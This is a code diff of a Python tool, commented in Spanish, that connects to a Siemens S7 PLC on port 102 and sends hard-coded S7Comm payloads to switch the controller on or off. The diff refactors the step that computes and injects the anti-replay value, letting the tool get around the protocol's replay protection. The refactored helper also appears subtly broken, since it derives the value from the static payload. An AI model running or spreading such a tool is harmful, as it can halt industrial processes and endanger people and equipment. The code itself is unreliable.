@@ -203,10 +203,18 @@ def fImprimirSalida(stdscr, message):
   output_win.refresh()
 
 
-def fCalcValorAntiReplay(pPayloadDeRespSolS7Comm):
-  vChallenge = pPayloadDeRespSolS7Comm.hex()[48:50]
-  vAntiReplay = int(vChallenge, 16) + int("80", 16)
+def fCalcValorAntiReplay(pPayload):
+  vChallenge = pPayload.hex()[48:50]
+  vAntiReplay = int(vChallenge, 16) + 0x80
   return vAntiReplay
+
+def fInsertarAntiReplay(payload, offset=24):
+  """Inserta el valor anti-replay en las posiciones correctas del payload."""
+  vAntiReplay = fCalcValorAntiReplay(payload)
+  vPayloadModificado = bytearray(payload)
+  vPayloadModificado[offset] = (vAntiReplay >> 8) & 0xFF
+  vPayloadModificado[offset + 1] = vAntiReplay & 0xFF
+  return bytes(vPayloadModificado)
 
 def fEncApagPLC(pHostPLC, pAction):
   # --- Payloads ---
@@ -219,10 +227,10 @@ def fEncApagPLC(pHostPLC, pAction):
   vPayloadParaResponderAlChallenge = bytes.fromhex('0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000')
   #vRespAntiReplayResuelto       = bytes.fromhex('0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000')
   # Payload par enviar la orden de encendido del PLC. Longitud: 121
-  vPayloadParaEncenderPLC = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000')
+  vPayloadParaEncenderElPLC = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000')
   #vRespEncenderPLC       = bytes.fromhex('0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000')
   # Payload par enviar la orden de apagado del PLC. Longitud: 121
-  vPayloadParaApagarPLC   = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000')
+  vPayloadParaApagarElPLC   = bytes.fromhex('0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000')
   #vRespApagarPLC         = bytes.fromhex('0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000')
   # ----------------
   
@@ -230,32 +238,25 @@ def fEncApagPLC(pHostPLC, pAction):
   vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   vSocketConPLC.connect((pHostPLC, 102))
   # Enviar payload de solicitud de comunicacion COTP
-  vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
+  vSocketConPLC.send(vPayloadSolComCOTP)
   vPayloadDeRespSolComCOTP = vSocketConPLC.recv(1024)
   # Enviar payload de solicitud de comunicación S7Comm
-  vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
+  vSocketConPLC.send(vPayloadSolComS7)
   vPayloadDeRespSolComS7 = vSocketConPLC.recv(1024)
   # Preparar payload de respuesta al challenge
-  vAntiReplay = fCalcValorAntiReplay(vPayloadParaResponderAlChallenge)
-  vPayloadParaResponderAlChallenge = vPayloadParaResponderAlChallenge[:46]  + hex(vAntiReplay)[2] + vPayloadParaResponderAlChallenge[47:]
-  vPayloadParaResponderAlChallenge = vPayloadParaResponderAlChallenge[:47]  + hex(vAntiReplay)[3] + vPayloadParaResponderAlChallenge[48:]
-  vPayloadParaResponderAlChallenge = bytes.fromhex(vPayloadConRespuestaAlChallenge)
+  vPayloadParaResponderAlChallenge = fInsertarAntiReplay(vPayloadParaResponderAlChallenge)
   if pAction == "Encender":
     # Inyectar anti-replay al payload de encender y enviarlo 
-    vAntiReplay = fCalcValorAntiReplay(vPayloadParaEncenderPLC)
-    vPayloadParaEncenderPLC = vPayloadParaEncenderPLC[:46] + hex(vAntiReplay)[2] + vPayloadParaEncenderPLC[47:]
-    vPayloadParaEncenderPLC = vPayloadParaEncenderPLC[:47] + hex(vAntiReplay)[3] + vPayloadParaEncenderPLC[48:]
-    print(f"Enviando encendido con antireplay: {vPayloadParaEncenderPLC}")
-    vSocketConPLC.send(bytearray.fromhex(vPayloadParaEncenderPLC))
+    vPayloadParaEncenderElPLC = fInsertarAntiReplay(vPayloadParaEncenderElPLC)
+    print(f"Enviando encendido con antireplay: {vPayloadParaEncenderElPLC}")
+    vSocketConPLC.send(vPayloadParaEncenderElPLC)
     vPayloadDeRespEncendido = vSocketConPLC.recv(1024)
     vSocketConPLC.close()
   elif pAction == "Apagar":
     # Inyectar anti-replay al payload de apagar y enviarlo 
-    vAntiReplay = fCalcValorAntiReplay(vPayloadParaApagarPLC)
-    vPayloadParaApagarPLC  = vPayloadParaApagarPLC[:46]  + hex(vAntiReplay)[2] + vPayloadParaApagarPLC[47:]
-    vPayloadParaApagarPLC  = vPayloadParaApagarPLC[:47]  + hex(vAntiReplay)[3] + vPayloadParaApagarPLC[48:]
-    print(f"Enviando apagado con antireplay: {vPayloadParaApagarPLC}")
-    vSocketConPLC.send(bytearray.fromhex(vPayloadParaApagarPLC))
+    vPayloadParaApagarElPLC = fInsertarAntiReplay(vPayloadParaApagarElPLC)
+    print(f"Enviando apagado con antireplay: {vPayloadParaApagarElPLC}")
+    vSocketConPLC.send(vPayloadParaApagarElPLC)
     vPayloadDeRespApagado = vSocketConPLC.recv(1024)
     vSocketConPLC.close()
   else:
